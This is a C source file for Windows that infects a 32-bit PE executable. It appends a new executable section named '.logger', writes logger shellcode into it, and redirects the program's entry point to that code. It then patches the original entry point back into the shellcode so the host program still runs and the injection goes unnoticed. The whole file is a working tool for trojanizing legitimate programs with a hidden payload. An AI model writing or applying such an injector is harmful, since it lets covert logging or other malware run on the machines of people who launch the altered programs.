#include <stdio.h>
#include <Windows.h>

#include "logger.h"

VOID ExitError(char *error)
{
    fprintf(stderr, "%s \n", error);
    ExitProcess(1);
}

DWORD Align(DWORD size, DWORD align, DWORD address)
{
    // Information about the sections should be aligned
    if (size % align) return address + (size / align + 1) * align;
    else return address + size;
}

int main(int argc, char **argv)
{
    if (argc < 2) ExitError("No PE executable provided");

    HANDLE pe = CreateFile(argv[1], GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (pe == INVALID_HANDLE_VALUE) ExitError("Can't open PE executable");

	DWORD peSize = GetFileSize(pe, NULL);
	if (peSize == 0) ExitError("Can't obtain PE executable size");

    // Copy PE executable to buffer
    PBYTE peBuffer = GlobalAlloc(GMEM_FIXED, peSize);
	ReadFile(pe, peBuffer, peSize, NULL, NULL);

	PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER) peBuffer;

    if (dos->e_magic != IMAGE_DOS_SIGNATURE) ExitError("Can't find PE signature in file provided");

	PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS) (peBuffer + dos->e_lfanew);

    // Only 32-bit supported
	if (nt->FileHeader.Machine != IMAGE_FILE_MACHINE_I386) ExitError("PE executable provided is not 32-bit");

    printf("PE executable parsed successfully \n");
    // Last section header
    PIMAGE_SECTION_HEADER last = IMAGE_FIRST_SECTION(nt) + nt->FileHeader.NumberOfSections - 1;
    // New section header
    PIMAGE_SECTION_HEADER new = IMAGE_FIRST_SECTION(nt) + nt->FileHeader.NumberOfSections;

    // Subtract function addresses to get shellcode size
    DWORD codeSize = (DWORD) LoggerEnd - (DWORD) LoggerStart;
    printf("Logger shellcode size is %d \n", codeSize);

    // Initialize new section
	ZeroMemory(new, sizeof(IMAGE_SECTION_HEADER));
    
    // Maximum section name size is 8
	CopyMemory(new->Name, ".logger", 8); 

    // Fill out info about new section with alignment accordingly
	new->VirtualAddress   = Align(last->Misc.VirtualSize, nt->OptionalHeader.SectionAlignment, last->VirtualAddress);
	new->Misc.VirtualSize = Align(codeSize + 1, nt->OptionalHeader.SectionAlignment, 0);
	new->SizeOfRawData    = Align(codeSize + 1, nt->OptionalHeader.FileAlignment, 0);
	new->PointerToRawData = Align(last->SizeOfRawData, nt->OptionalHeader.FileAlignment, last->PointerToRawData);
    // Make new section executable
	new->Characteristics  = IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE;
    // New end of file is end of the new section
	SetFilePointer(pe, new->PointerToRawData + new->SizeOfRawData, NULL, FILE_BEGIN);	
	SetEndOfFile(pe);
    // Update size of image and number of sections
	nt->OptionalHeader.SizeOfImage = new->VirtualAddress + new->Misc.VirtualSize;
	nt->FileHeader.NumberOfSections += 1;

    printf("New section %s on the end of PE added \n", new->Name);
    // Original entry point
    DWORD oep = nt->OptionalHeader.AddressOfEntryPoint + nt->OptionalHeader.ImageBase;
    printf("Original entry point obtained at %lX \n", oep);

    // New entry point is the start of new section
    nt->OptionalHeader.AddressOfEntryPoint = new->VirtualAddress;
    // Write changes
    SetFilePointer(pe, 0, NULL, FILE_BEGIN);
	WriteFile(pe, peBuffer, peSize, NULL, 0);

    GlobalFree(peBuffer);
    // Copy shellcode to buffer
    PDWORD code = GlobalAlloc(GMEM_FIXED, codeSize + 1);
    CopyMemory(code, (PDWORD) LoggerStart, codeSize);

    for (DWORD i = 0; i < codeSize; ++i) 
    {   
        // Find and change placeholder to real oep
        if (code[i] == OEP_PLACEHOLDER) { code[i] = oep; break; }
    }

    printf("Original entry point added to the shellcode \n");
    // Move file pointer to start of the new section and write shellcode
    SetFilePointer(pe, new->PointerToRawData, NULL, FILE_BEGIN);
    WriteFile(pe, code, codeSize, NULL, 0);

    printf("Shellcode written to the new section \n");

	CloseHandle(pe);
    GlobalFree(code);
   
    return 0;
}
